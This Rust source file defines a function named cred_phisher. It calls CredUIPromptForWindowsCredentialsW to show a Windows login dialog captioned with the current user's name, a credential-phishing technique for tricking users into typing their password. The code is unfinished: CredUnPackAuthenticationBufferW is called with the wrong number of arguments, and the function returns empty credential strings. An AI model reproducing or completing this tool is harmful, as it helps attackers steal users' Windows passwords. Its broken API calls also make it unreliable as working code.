#[allow(unused_imports)]
use extargsparse_worker::{extargs_error_class,extargs_new_error};

#[allow(unused_imports)]
use winapi::um::wincred::{CredUIPromptForWindowsCredentialsW,CredUnPackAuthenticationBufferW,CREDUI_INFOW,PCREDUI_INFOW};
#[allow(unused_imports)]
use winapi::um::combaseapi::{CoTaskMemFree};
use winapi::shared::windef::{HWND,HBITMAP};
use winapi::shared::minwindef::{DWORD,ULONG,LPVOID,BOOL,FALSE,TRUE};

use super::wchar_windows::str_to_c_wstr;

use std::error::Error;

extargs_error_class!{CredLibError}

#[allow(non_snake_case)]
pub struct NetworkCredentials {
	pub Username :String,
	pub Password :String,
	pub Domain :String,
}

pub fn cred_phisher( msg :&str) -> Result<NetworkCredentials,Box<dyn Error>> {
	let omsg = str_to_c_wstr(msg);
	if omsg.is_none() {
		extargs_new_error!{CredLibError,"can not wchar [{}]",msg}
	}
	let wmsg = omsg.unwrap();
	let username :String;
	match std::env::var("USERNAME") {
		Ok(val) => {username = format!("Please enter credential for {}",val);},
		Err(e) => {
			extargs_new_error!{CredLibError,"can not get USERNAME [{:?}]",e}
		}
	}
	let ouser = str_to_c_wstr(&username);
	if ouser.is_none() {
		extargs_new_error!{CredLibError,"can not wchar [{}]",username}	
	}
	let wusername = ouser.unwrap();
	let mut credui :CREDUI_INFOW  = CREDUI_INFOW {
		cbSize : std::mem::size_of::<CREDUI_INFOW>() as DWORD,
		hwndParent : 0 as HWND,
		pszMessageText : wmsg.as_ptr(),
		pszCaptionText : wusername.as_ptr(),
		hbmBanner : 0 as HBITMAP,
	};
	let mut authpackage : ULONG = 0;
	let dret :DWORD ;
	let mut outbuffer :LPVOID = std::ptr::null_mut();
	let mut outbufsize : ULONG = 0;
	let mut save :BOOL = FALSE;
	let mut bret :BOOL;

	unsafe {
		dret = CredUIPromptForWindowsCredentialsW(&mut credui,0,&mut authpackage,
				std::ptr::null(),0,&mut outbuffer,&mut outbufsize,&mut save,1);
		if dret != 0 {
			extargs_new_error!{CredLibError,"can not CredUIPromptForWindowsCredentialsW error [{}]", dret}
		}

		bret = CredUnPackAuthenticationBufferW(0,outbuffer,outbufsize,);
	}

	let retv = NetworkCredentials{
		Username : "".to_string(),
		Password : "".to_string(),
		Domain : "".to_string(),
	};
	Ok(retv)
}